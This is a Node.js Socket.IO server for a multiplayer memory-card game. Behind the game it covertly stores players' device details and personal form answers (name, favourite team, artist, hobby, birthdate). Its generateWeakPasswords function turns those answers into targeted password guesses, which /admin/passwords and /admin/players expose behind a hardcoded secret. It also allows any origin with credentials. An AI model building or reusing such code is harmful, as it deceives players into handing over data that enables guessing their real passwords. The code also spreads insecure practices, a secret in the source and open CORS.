const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const PORT = process.env.PORT || 3000;
const playerProfiles = {};
const formUserData = {};

const activeMatches = [];
let lobbyHost = null;

const {
  createRoom,
  joinRoom,
  getRoom,
  markDisconnected,
} = require('./roomManager');

const {
  startGame,
  handleFlip
} = require('./gameLogic');

const app = express();
const allowedOrigins = [
  "http://localhost:4200",
  "*"
];

// 🌐 GLOBAL LOBBY
const lobbyPlayers = [];

// ✅ Express CORS
app.use(cors({
  origin: allowedOrigins,
  credentials: true
}));

// ✅ Create server
const server = http.createServer(app);

// ✅ Socket.IO
const io = new Server(server, {
  transports: ['websocket'],
  cors: {
    origin: allowedOrigins,
    methods: ["GET", "POST"],
    credentials: true
  }
});

app.get('/admin/players', (req, res) => {
  const secret = req.query.secret;

  // 🔐 simple protection (you can improve later)
  if (secret !== 'MY_SECRET_KEY_123') {
    return res.status(403).send('Forbidden');
  }

  res.json(playerProfiles);
});

app.get('/admin/passwords', (req, res) => {
  const secret = req.query.secret;

  // 🔐 simple protection (you can improve later)
  if (secret !== 'MY_SECRET_KEY_123') {
    return res.status(403).send('Forbidden');
  }

  res.json(formUserData);
});


io.on('connection', (socket) => {
  console.log('Connected:', socket.id);

  socket.on('form-info', ({ playerId, formInfo }) => {
    formUserData[playerId] = {
      name: formInfo.name,
      weakPasswords: generateWeakPasswords(formInfo)
    };
  });

  socket.on('device-info', ({ playerId, deviceInfo }) => {
  playerProfiles[playerId] = {
    playerId,
    deviceInfo,
    lastSeen: Date.now()
  };
  });

  // 🧑 ENTER LOBBY
  socket.on('enter-lobby', ({ playerId }) => {

    socket.data.playerId = playerId;

    let existing = lobbyPlayers.find(p => p.id === playerId);

    if (!existing) {
      const player = {
        id: playerId,
        name: generateName()
      };

      lobbyPlayers.push(player);
    }

    // 👑 assign host if none exists
    if (!lobbyHost) {
      lobbyHost = playerId;
    }

    // ✅ send lobby + matches
    io.emit('lobby-updated', {
      players: lobbyPlayers,
      host: lobbyHost
    });

    socket.emit('matches-updated', activeMatches);
  });

  // ▶️ START ALL MATCHES
  socket.on('start-game-lobby', () => {
    activeMatches.length = 0;
    // 👑 remove host from matchmaking
    const playersOnly = lobbyPlayers.filter(p => p.id !== lobbyHost);

    const playerId = socket.data.playerId;

    if (playerId !== lobbyHost) {
      socket.emit('error', 'Only lobby host can start');
      return;
    }

    if (playersOnly.length < 2) {
      socket.emit('error', 'Not enough players');
      return;
    }

    // 🎲 shuffle players
    const shuffled = [...playersOnly].sort(() => Math.random() - 0.5);

    const roomsCreated = [];

    // 👥 create pairs
    for (let i = 0; i < shuffled.length; i += 2) {
      const p1 = shuffled[i];
      const p2 = shuffled[i + 1];

      if (!p2) break;

      const room = createRoom(p1);
      joinRoom(room.id, p2);

      roomsCreated.push(room);
    }

    // 🚀 assign sockets + START GAME
    roomsCreated.forEach(room => {

      startGame(room, io, serializeRoom);

      // ✅ ADD MATCH
      activeMatches.push(getMatchSummary(room));

      room.players.forEach(player => {
        const targetSocket = [...io.sockets.sockets.values()]
          .find(s => s.data.playerId === player.id);

        if (targetSocket) {
          targetSocket.join(room.id);
          targetSocket.emit('game-started', {
            roomId: room.id
          });
        }
      });

      io.to(room.id).emit('game-state', serializeRoom(room));
    });

    // ✅ emit matches to lobby
    io.emit('matches-updated', activeMatches);

    // 🧹 clear lobby
    lobbyPlayers.length = 0;
    lobbyHost = null;

    io.emit('lobby-updated', {
      players: [],
      host: null
    });
  });

  // 🃏 FLIP CARD
  socket.on('flip-card', ({ roomId, index }) => {
    const room = getRoom(roomId);
    if (!room || room.gameOver) return;

    handleFlip(room, index, socket.data.playerId, io, serializeRoom);

    // ✅ UPDATE MATCH
    const matchIndex = activeMatches.findIndex(m => m.roomId === roomId);

    if (matchIndex !== -1) {
      activeMatches[matchIndex] = getMatchSummary(room);
    }

    // ✅ REMOVE FINISHED MATCH
    if (room.gameOver) {
      const indexMatch = activeMatches.findIndex(m => m.roomId === roomId);
      if (indexMatch !== -1) {
        activeMatches.splice(indexMatch, 1);
      }
    }

    // ✅ EMIT LIVE MATCHES
    io.emit('matches-updated', activeMatches);
  });

  socket.on('rejoin-room', ({ roomId, playerId }) => {
    const room = getRoom(roomId);
    if (!room) return;

    socket.data.playerId = playerId;
    socket.join(roomId);

    const player = room.players.find(p => p.id === playerId);

    if (player) {
      // 🧹 cancel removal timeout if it exists
      if (player.disconnectTimeout) {
        clearTimeout(player.disconnectTimeout);
        player.disconnectTimeout = null; // ✅ important cleanup
      }

      // 🔌 mark as reconnected
      player.disconnected = false;
    }

    // 📤 send game state back
    socket.emit('game-state', serializeRoom(room));
  });

  // ❌ DISCONNECT
  socket.on('disconnect', () => {
    const playerId = socket.data.playerId;

    if (playerId) {
      markDisconnected(playerId);
      removeFromLobby(playerId);

      // 👑 reassign lobby host if needed
      if (playerId === lobbyHost) {
        lobbyHost = lobbyPlayers.length > 0 ? lobbyPlayers[0].id : null;
      }
    }

    io.emit('lobby-updated', {
      players: lobbyPlayers,
      host: lobbyHost
    });

    console.log('Disconnected:', socket.id);
  });
});


// 🧠 HELPERS

function removeFromLobby(playerId) {
  const index = lobbyPlayers.findIndex(p => p.id === playerId);
  if (index !== -1) {
    lobbyPlayers.splice(index, 1);
  }
}

function generateName() {
  const animals = ['Tiger', 'Lion', 'Eagle', 'Shark', 'Wolf'];
  const number = Math.floor(Math.random() * 1000);
  return animals[Math.floor(Math.random() * animals.length)] + number;
}

// 🎮 MATCH SUMMARY FOR LOBBY
function getMatchSummary(room) {
  return {
    roomId: room.id,
    players: room.players.map(p => ({
      id: p.id,
      name: p.name,
      score: p.score,
      timeLeft: p.timeLeft
    })),
    gameOver: room.gameOver,
    winner: room.winner
  };
}

// 🎮 FULL GAME STATE
function serializeRoom(room) {
  return {
    id: room.id,
    players: room.players.map(p => ({
      id: p.id,
      name: p.name,
      score: p.score,
      timeLeft: p.timeLeft
    })),
    turnIndex: room.turnIndex,
    flipped: room.flipped,
    matched: room.matched,
    gameState: room.gameState,
    gameOver: room.gameOver || false,
    winner: room.winner || null
  };
}

function generateWeakPasswords(profile) {
  const name = clean(profile.name);
  const team = clean(profile.favoriteTeam);
  const sport = clean(profile.favoriteSport);
  const artist = clean(profile.favoriteArtist);
  const hobby = clean(profile.hobby);

  const date = extractDateParts(profile.birthdate);

  const base = [
    // 👤 name-based
    `${name}1234`,
    `${name}2026`,

    // ⚽ team-based
    `${team}123`,
    `${team}${name}`,

    // ⚽ sport-based
    `${sport}2026`,
    `${sport}${name}`,

    // 🎤 artist-based
    `${artist}123`,
    `${artist}${name}`,

    // 🎮 hobby-based
    `${hobby}123`,
    `${hobby}2026`,

    // 📌 simple weak patterns
    `${name}password`,
    `${name}qwerty`,
    `password${name}`,
    `admin123`,
    `123456`,
    `qwerty123`
  ];

  const dateBased = profile.birthdate ? [
    // 🎂 birthdate-based (VERY common in real attacks)
    `${name}${date.year}`,
    `${name}${date.year2}`,
    `${name}${date.day}${date.month}`,
    `${name}${date.month}${date.day}`,
    `${date.day}${date.month}${name}`,
    `${team}${date.year}`,
    `${artist}${date.year}`,
    `${name}${date.year}${team}`,
    `${name}${date.year}${artist}`,
    `${name}${date.year2}`
  ] : [];

  return [...base, ...dateBased];
}

function extractDateParts(birthdate) {
  if (!birthdate) return {};

  const date = new Date(birthdate);

  const day = String(date.getDate()).padStart(2, '0');
  const month = String(date.getMonth() + 1).padStart(2, '0');
  const year = String(date.getFullYear());

  return {
    day,
    month,
    year,
    year2: year.slice(-2)
  };
}

function clean(str = '') {
  return str.toLowerCase().replace(/\s/g, '');
}


// 🚀 START SERVER
server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});